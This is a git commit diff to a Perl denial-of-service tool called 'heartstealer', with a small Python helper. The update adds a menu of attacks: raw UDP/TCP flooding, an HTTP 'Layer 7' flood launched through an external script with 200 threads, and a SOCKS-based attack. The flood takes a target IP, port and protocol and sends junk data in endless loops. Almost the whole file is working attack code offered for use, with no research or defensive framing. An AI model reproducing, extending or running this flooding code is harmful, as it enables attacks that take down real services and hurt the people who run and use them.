b34c12caa4105a77d55c83391e774a2d2e24ef35
KenDzz <ngatu9x@gmail.com>
2021-10-10 18:29:14 +0700

    update v2

--- heartstealer.pl
+++ heartstealer.pl
@@ -7,25 +7,29 @@ system("cls || clear");
 #Script Banner================================================================
 print q{ 
 
-$$\   $$\                                $$\      $$$$$$\    $$\                         $$\                     
-$$ |  $$ |                               $$ |    $$  __$$\   $$ |                        $$ |                    
-$$ |  $$ | $$$$$$\   $$$$$$\   $$$$$$\ $$$$$$\   $$ /  \__|$$$$$$\    $$$$$$\   $$$$$$\  $$ | $$$$$$\   $$$$$$\  
-$$$$$$$$ |$$  __$$\  \____$$\ $$  __$$\\_$$  _|  \$$$$$$\  \_$$  _|  $$  __$$\  \____$$\ $$ |$$  __$$\ $$  __$$\ 
-$$  __$$ |$$$$$$$$ | $$$$$$$ |$$ |  \__| $$ |     \____$$\   $$ |    $$$$$$$$ | $$$$$$$ |$$ |$$$$$$$$ |$$ |  \__|
-$$ |  $$ |$$   ____|$$  __$$ |$$ |       $$ |$$\ $$\   $$ |  $$ |$$\ $$   ____|$$  __$$ |$$ |$$   ____|$$ |      
-$$ |  $$ |\$$$$$$$\ \$$$$$$$ |$$ |       \$$$$  |\$$$$$$  |  \$$$$  |\$$$$$$$\ \$$$$$$$ |$$ |\$$$$$$$\ $$ |      
-\__|  \__| \_______| \_______|\__|        \____/  \______/    \____/  \_______| \_______|\__| \_______|\__|      
+    $$\   $$\                                $$\      $$$$$$\    $$\                         $$\                     
+    $$ |  $$ |                               $$ |    $$  __$$\   $$ |                        $$ |                    
+    $$ |  $$ | $$$$$$\   $$$$$$\   $$$$$$\ $$$$$$\   $$ /  \__|$$$$$$\    $$$$$$\   $$$$$$\  $$ | $$$$$$\   $$$$$$\  
+    $$$$$$$$ |$$  __$$\  \____$$\ $$  __$$\\_$$  _|  \$$$$$$\  \_$$  _|  $$  __$$\  \____$$\ $$ |$$  __$$\ $$  __$$\ 
+    $$  __$$ |$$$$$$$$ | $$$$$$$ |$$ |  \__| $$ |     \____$$\   $$ |    $$$$$$$$ | $$$$$$$ |$$ |$$$$$$$$ |$$ |  \__|
+    $$ |  $$ |$$   ____|$$  __$$ |$$ |       $$ |$$\ $$\   $$ |  $$ |$$\ $$   ____|$$  __$$ |$$ |$$   ____|$$ |      
+    $$ |  $$ |\$$$$$$$\ \$$$$$$$ |$$ |       \$$$$  |\$$$$$$  |  \$$$$  |\$$$$$$$\ \$$$$$$$ |$$ |\$$$$$$$\ $$ |      
+    \__|  \__| \_______| \_______|\__|        \____/  \______/    \____/  \_______| \_______|\__| \_______|\__|      
                                                                                                                  
                                                                                                                                                                                                                              
 
- [---]   by:> VVQUA & TXKHAI   [---]
- =-------=-=-=-=-=-=-=-=-=-------=
+    [---]   by:> VVQUA & TXKHAI   [---]
+    =-------=-=-=-=-=-=-=-=-=-------=
 };
+print("\n");
+
+
+
 # Check Intenret Connection !
 print("\r[~] Checking Internet Connection [...]");
 STDOUT->flush();
 sleep(2);
-my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com', 
+my $check = IO::Socket::INET->new('PeerAddr'=>'www.google.com', 
 	'PeerPort'=>80, 
 	'Timeout'=>2, 
 	'proto'=>'tcp');
@@ -35,108 +39,145 @@ if(!(defined $check && $check)){
 	exit(1);
 }
 $check->close();
-print("\r[+] Checking Internet Connection [Connected]");
+print("\r[+] Checking Internet Connection [Connected] \n");
 STDOUT->flush();
 # INPUT TARGET INFO ==============================================
 
-print("\n\n[~] Enter TargetIP: "); # Set Target IP
-$host = <STDIN>;
-chomp ($host);
-while ($host eq ""){
- print "   [!] Enter TargetIP?: ";
- $host = <STDIN>;
- chomp ($host);
+print q{
+    =========================================================
+    |   1    |  DDOS UDP & TCP                              |
+    |   2    |  DDOS LAYER 7                                |
+    |   3    |  DDOS SOCK5 & SOCK4                          |
+    =========================================================
+};
+print("\n\n[~]Choose: "); # Set Target IP
+$choose = <STDIN>;
+chomp ($choose);
+while ($choose eq ""){
+ print "   [!] Choose: ";
+ $choose = <STDIN>;
+ chomp ($choose);
 }
-print "TRAGET ==> $host\n";
-print "\n===============================";
-print "\n[~] Enter Port: "; # Set Port
-$port = <STDIN>;
-chomp ($port);
-while ($port eq "" || !looks_like_number($port) || !grep{$port eq $_}(0..65535)){ 
- print "   [!] Enter PORT?: ";       
- $port = <STDIN>;
- chomp ($port); 
-} 
-print "PORT ==> $port\n";
-print "\n===============================";
-print "\n[~] Enter Protockol (TCP or UDP) :"; # Set Protockol;
-$proto = <STDIN>;
-chomp ($proto);
-while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
- print "   [!] Enter Protockol (TCP or UDP) ?: ";
- $proto = <STDIN>;
- chomp ($proto);
-}
-print "Protocol ==> $proto";
-print "\n===============================\n";
-sleep(1);
 
-$sock = IO::Socket::INET->new(
-        PeerAddr => $host,
-        PeerPort => $port,
-        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
-system("clear || cls");
-print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
-sleep(1);
-if(grep{$proto eq $_} 'TCP','tcp'){
-    while (1) {
-       $sock = IO::Socket::INET->new(
-        PeerAddr => $host,
-        PeerPort => $port,
-        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
-        for($i=0; $i<=500; $i++){
-            $size = rand() * 8921873 * 99919988;
-            send($sock, $size, $size);
-            send($sock, $size*2, $size*2); 
-            send($sock, $size*3, $size*3);
-            send($sock, $size*4, $size*4);
-            send($sock, $size*9999999999999,$size*9999999999999);
-            send($sock, $size*999999999999999,$size*999999999999999);
-            send($sock, $size*9999999999999,$size*9999999999999);
-            send($sock, $size*4, $size*4);
-            send($sock, $size*3, $size*3);
-            send($sock, $size*2, $size*2);
-            send($sock, $size, $size);
-            send($sock, $size*9999999999999,$size*9999999999999);
-            send($sock, $size*999999999999999,$size*999999999999999);
-            send($sock, $size*9999999999999,$size*9999999999999);
+if ($choose == 1) {
 
-            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
-        }
+    print("\n\n[~]IP: "); # Set Target IP
+    $host = <STDIN>;
+    chomp ($host);
+    while ($host eq ""){
+     print "   [!] IP: ";
+     $host = <STDIN>;
+     chomp ($host);
     }
+    print "TRAGET ==> $host\n";
+    print "\n===============================";
+    print "\n[~] Port: "; # Set Port
+    $port = <STDIN>;
+    chomp ($port);
+    while ($port eq "" || !looks_like_number($port) || !grep{$port eq $_}(0..65535)){ 
+     print "   [!] PORT: ";       
+     $port = <STDIN>;
+     chomp ($port); 
+    } 
+    print "PORT ==> $port\n";
+    print "\n===============================";
+    print "\n[~] Enter Protockol (TCP or UDP) :"; # Set Protockol;
+    $proto = <STDIN>;
+    chomp ($proto);
+    while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
+     print "   [!] Enter Protockol (TCP or UDP) ?: ";
+     $proto = <STDIN>;
+     chomp ($proto);
+    }
+    print "Protocol ==> $proto";
+    print "\n===============================\n";
+    sleep(1);
 
-}else {
-   $sock = IO::Socket::INET->new(
-        PeerAddr => $host,
-        PeerPort => $port,
-        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
-   while (1) {
-            $size = rand() * 8921873 * 99919988;
-            send($sock, $size, $size);
-            send($sock, $size*2, $size*2);
-            send($sock, $size*3, $size*3);
-            send($sock, $size*4, $size*4);
-            send($sock, $size*9999999999999,$size*9999999999999);
-            send($sock, $size*999999999999999,$size*999999999999999);
-            send($sock, $size*9999999999999,$size*9999999999999);
-            send($sock, $size*4, $size*4);
-            send($sock, $size*3, $size*3);
-            send($sock, $size*2, $size*2);
-            send($sock, $size, $size);
-            send($sock, $size*9999999999999,$size*9999999999999);
-            send($sock, $size*999999999999999,$size*999999999999999);
-            send($sock, $size*9999999999999,$size*9999999999999);
+    $sock = IO::Socket::INET->new(
+            PeerAddr => $host,
+            PeerPort => $port,
+            Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
+    system("clear || cls");
+    print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
+    sleep(1);
+    if(grep{$proto eq $_} 'TCP','tcp'){
+        while (1) {
+           $sock = IO::Socket::INET->new(
+            PeerAddr => $host,
+            PeerPort => $port,
+            Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
+            for($i=0; $i<=500; $i++){
+                $size = rand() * 8921873 * 99919988;
+                send($sock, $size, $size);
+                send($sock, $size*2, $size*2); 
+                send($sock, $size*3, $size*3);
+                send($sock, $size*4, $size*4);
+                send($sock, $size*9999999999999,$size*9999999999999);
+                send($sock, $size*999999999999999,$size*999999999999999);
+                send($sock, $size*9999999999999,$size*9999999999999);
+                send($sock, $size*4, $size*4);
+                send($sock, $size*3, $size*3);
+                send($sock, $size*2, $size*2);
+                send($sock, $size, $size);
+                send($sock, $size*9999999999999,$size*9999999999999);
+                send($sock, $size*999999999999999,$size*999999999999999);
+                send($sock, $size*9999999999999,$size*9999999999999);
 
-            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
+                print ("Attack: (=>$host:$port~$proto<=)\n");
+            }
+        }
 
-   }
+    }else {
+       $sock = IO::Socket::INET->new(
+            PeerAddr => $host,
+            PeerPort => $port,
+            Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
+       while (1) {
+                $size = rand() * 8921873 * 99919988;
+                send($sock, $size, $size);
+                send($sock, $size*2, $size*2);
+                send($sock, $size*3, $size*3);
+                send($sock, $size*4, $size*4);
+                send($sock, $size*9999999999999,$size*9999999999999);
+                send($sock, $size*999999999999999,$size*999999999999999);
+                send($sock, $size*9999999999999,$size*9999999999999);
+                send($sock, $size*4, $size*4);
+                send($sock, $size*3, $size*3);
+                send($sock, $size*2, $size*2);
+                send($sock, $size, $size);
+                send($sock, $size*9999999999999,$size*9999999999999);
+                send($sock, $size*999999999999999,$size*999999999999999);
+                send($sock, $size*9999999999999,$size*9999999999999);
+
+                print ("Attack: (=>$host:$port~$proto<=)\n");
+
+       }
+    }
+    $sock->close()
+}elsif ($choose == 2){
+    print("\n\n[~]Target Website (HTTP): "); # Set Target Web
+    $web = <STDIN>;
+    chomp ($web);
+    while ($web eq ""){
+     print "   [!] IP: ";
+     $web = <STDIN>;
+     chomp ($web);
+    }  
+    print "Target ==> $web\n";
+    print "\n===============================";
+    print "\n[~] Time (500): "; # Set Time
+    $time = <STDIN>;
+    chomp ($time);
+    while ($time eq ""){ 
+     print "   [!] PORT: ";       
+     $time = <STDIN>;
+     chomp ($time); 
+    }
+    print "Time ==> $time\n";
+    print "\n===============================";
+    sleep(1);
+
+    system("python ./lib/overload/overload.py --target $web --method HTTP --time $time --thread 200") == 0 or die "Python script returned error $?";
+}elsif ($choose == 3){
+    system("python ./lib/cc/cc.py") == 0 or die "Python script returned error $?";
 }
-$sock->close()
-##############################################################
-#####################                #########################
-#####################  END OF SCRIPT #########################
-#####################                #########################
-##############################################################
-#This Script by Oseid Aldary
-#Have a nice day :)
-#GoodBye
---
+++ lib/overload/tools/addons/clean.py
@@ -0,0 +1,8 @@
+# Importa os modulos
+import os
+
+# Limpa o CMD
+if os.name == "nt":
+    os.system("@cls & @title Heartstealer DDOS Tool by: VVQUA & TXKHAI e")
+else:
+    os.system("clear")
